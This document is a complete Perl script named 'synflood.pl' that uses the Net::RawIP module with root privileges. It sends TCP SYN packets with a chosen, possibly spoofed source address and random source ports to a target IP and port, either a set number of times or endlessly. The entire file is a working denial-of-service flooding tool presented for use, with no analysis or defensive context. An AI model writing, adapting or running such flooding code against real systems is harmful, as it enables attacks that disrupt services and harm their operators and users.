#!/usr/bin/perl
# synflood.pl - Simple SYN Flooder
# Author: iphelix
#
# Requires perl, Net::RawIP module, and root privileges

use Net::RawIP;

if($#ARGV >= 2) {
   my ($src,$dst,$port, $num) = @ARGV;
   $a = new Net::RawIP;
   my $cnt;
   if (defined $num) 
   {
       $cnt = $num;
   }
   if (defined $cnt)
   {
       while($cnt--) {
          $src_port = rand(65534)+1;
          $a->set({ip => {saddr => $src,daddr => $dst},tcp => {source => $src_port,dest => $port, syn => 1}});
          $a->send;   
       }
   }
   else 
   {
       while(1) {
          $src_port = rand(65534)+1;
          $a->set({ip => {saddr => $src,daddr => $dst},tcp => {source => $src_port,dest => $port, syn => 1}});
          $a->send;   
       }
   }
} else {
   print "./synflooder source_ip destination_ip destination_port\n";
}

